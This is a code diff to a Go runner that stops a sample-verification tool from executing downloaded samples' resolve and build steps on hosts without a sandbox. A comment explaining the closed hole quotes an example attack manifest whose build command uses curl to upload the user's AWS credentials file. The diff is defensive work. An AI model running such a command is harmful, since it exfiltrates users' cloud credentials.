@@ -6,37 +6,62 @@ import (
 	"github.com/r2cuerdame/codesamplex/internal/domain"
 )
 
-// NativeRunner is the COMPILE_ONLY fallback for hosts without Docker.
-// Resolve and Build run natively (still with --ignore-scripts semantics
-// where the tool supports it); Contract NEVER runs sample code on the
-// host and returns an honest SKIPPED (goal.md §16.3).
+// NativeRunner is what a host without container isolation gets, and it
+// executes NOTHING from a sample.
+//
+// It used to run two stages natively, and both were remote code execution.
+//
+//	Build ran m.BuildCommand — an argv taken verbatim from a downloaded,
+//	unsigned manifest — as the user, with no isolation. Publishing a sample
+//	carrying {"buildCommand":["sh","-c","curl -T $HOME/.aws/credentials …"]}
+//	was enough: the next Docker-less peer with idle verification enabled
+//	claimed the job and ran it. A second door needed no cross-verification
+//	at all, because get_sample caches any network sample locally and
+//	`csx sample verify <id>` then unpacks and builds it.
+//
+//	Resolve ran a fixed per-ecosystem command, which sounds safer and is
+//	not: `pip install -r requirements.txt` executes setup.py from any sdist
+//	the sample names, and `cargo fetch`/`cargo build` runs build.rs. The
+//	attacker controls the dependency list even when they do not control the
+//	argv. It also wrote to /work/.csx-vendor, an absolute path that on a
+//	native host is nowhere near the sample directory.
+//
+// The package header has always said "Downloaded samples never run
+// directly on the host", and only the Contract stage honoured it.
+//
+// So COMPILE_ONLY now means what it can honestly mean on a host with no
+// sandbox: nothing ran, and the receipt says so at every stage. That costs
+// Docker-less machines their ability to contribute verification — which is
+// the correct price, because they cannot verify safely, and a receipt from
+// a machine that executed the sample it was judging would be worth less
+// than none.
 type NativeRunner struct{}
 
-// Resolve fetches dependencies natively without lifecycle scripts.
-func (NativeRunner) Resolve(ctx context.Context, dir string, m domain.SampleManifest) StageResult {
-	cmd, err := resolveCommand(m.Environment.Ecosystem, m.Environment.Runtime)
-	if err != nil {
-		return StageResult{Result: ResultFail, Log: err.Error()}
-	}
-	return runStage(ctx, dir, cmd)
+// nativeSkip is the reason attached to every stage.
+const nativeSkip = "no container isolation on this host (COMPILE_ONLY): " +
+	"a downloaded sample is never executed outside a sandbox, so this stage did not run"
+
+// Resolve does not fetch: dependency resolution executes code in most
+// ecosystems (setup.py, build.rs, lifecycle scripts), and the sample
+// chooses the dependencies.
+func (NativeRunner) Resolve(context.Context, string, domain.SampleManifest) StageResult {
+	return skipped(nativeSkip)
 }
 
-// Build runs the manifest's build command natively (typecheck/compile only).
-func (NativeRunner) Build(ctx context.Context, dir string, m domain.SampleManifest) StageResult {
-	if len(m.BuildCommand) == 0 {
-		return skipped("no build command in manifest")
-	}
-	return runStage(ctx, dir, m.BuildCommand)
+// Build does not run the manifest's command. The command comes from the
+// sample.
+func (NativeRunner) Build(context.Context, string, domain.SampleManifest) StageResult {
+	return skipped(nativeSkip)
 }
 
-// Contract is never executed natively: without container isolation the
-// receipt must say SKIPPED rather than pretend verification happened.
-func (NativeRunner) Contract(ctx context.Context, dir string, m domain.SampleManifest) StageResult {
-	return skipped("contract skipped: COMPILE_ONLY capability — sample code does not run on the host")
+// Contract never ran here, and still does not.
+func (NativeRunner) Contract(context.Context, string, domain.SampleManifest) StageResult {
+	return skipped(nativeSkip)
 }
 
-// StageEnvironment is the host environment: without a container, the
-// resolve and build stages really did run here.
+// StageEnvironment is the host environment. Nothing ran, so there is no
+// container to describe, and claiming one would be the same lie in the
+// other direction.
 func (NativeRunner) StageEnvironment(host domain.EnvironmentFingerprint, _ domain.SampleManifest) domain.EnvironmentFingerprint {
 	return host.Normalize()
 }
